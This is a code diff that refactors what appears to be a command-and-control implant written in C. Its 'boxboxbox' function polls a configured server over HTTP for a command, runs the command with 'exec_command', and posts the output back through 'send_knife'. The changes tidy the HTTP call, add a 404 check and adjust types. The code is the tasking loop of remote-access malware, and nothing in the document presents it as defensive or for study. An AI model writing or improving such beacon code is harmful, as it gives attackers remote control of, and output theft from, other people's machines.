@@ -4,7 +4,6 @@
 #include "../Protocol/Packer.h"
 #include "../Helpers/Http.h"
 #include "../Config/Settings.h"
-
 #include "../Common/shaco_stdlib.h"
 
 bool send_knife(PPACKER poison, uint32_t cmdid){
@@ -23,8 +22,8 @@ bool send_knife(PPACKER poison, uint32_t cmdid){
     packer_add_int32(packer, cmdid);
     packer_add_data(packer,packer_get_buffer(poison),packer_get_size(poison));
 
-    MSG("Sending response, size: %zu", packer_get_size(packer));
-    resp = http_post(sett->ip, sett->domain, sett->endpoint, sett->useragent, sett->port,sett->ssl, packer_get_buffer(packer), packer_get_size(packer));
+    MSG("Sending response, size: %lu", packer_get_size(packer));
+    resp = http_post(packer_get_buffer(packer), packer_get_size(packer));
     if(!resp) MSG("can't send output");
     success = true;
 
@@ -34,10 +33,9 @@ EXIT:
     return success;
 }
 
-
 bool boxboxbox(){
     bool success = false;
-    PHTTP_RESPONSE response = NULL;
+    PHTTP_RESPONSE http_response = NULL;
     PSETTINGS sett = get_settings();
     PPACKER packer = packer_init(), pack = NULL;
     if(!packer) { MSG("Erro in creating packer"); goto EXIT;}
@@ -48,20 +46,20 @@ bool boxboxbox(){
     packer_add_int32(packer, COMMAND_GET);
 
     MSG("Getting command from server");
-    response = http_post(sett->ip, sett->domain, sett->endpoint, sett->useragent, sett->port, sett->ssl, packer_get_buffer(packer), packer_get_size(packer));
-    if(!response) { MSG("Error in sending post"); goto EXIT; }
+    http_response = http_post(packer_get_buffer(packer), packer_get_size(packer));
+    if(!http_response) { MSG("Error in sending post"); goto EXIT; }
+    else if(http_response->status == 404) {MSG("404 not found");goto EXIT;}
 
-    size_t _tmp = 0;
-    int cmd_id = packer_get_int32((uint8_t *)response->response, &_tmp);
+    uint64_t _tmp= 0;
+    int cmd_id = packer_get_int32((uint8_t *)http_response->response, &_tmp);
     if(cmd_id == COMMAND_NO_JOB || cmd_id == COMMAND_ERR ) { MSG("no job"); goto EXIT;}
-    pack = exec_command((uint8_t *)response->response, cmd_id); //TODO: upload command not work correct because the int32
-
+    pack = exec_command((uint8_t *)http_response->response, cmd_id); 
     if(!pack) goto EXIT;
     if(!send_knife(pack, cmd_id)) { MSG("send response error"); goto EXIT;};
 
     success = true;
 EXIT:
-    if(response) { ZeroMemory(response, sizeof(HTTP_RESPONSE)); shaco_free(response);}
+    if(http_response) { http_free(http_response);}
     if(packer) packer_free(packer);
     if(pack) packer_free(pack);
     return success;
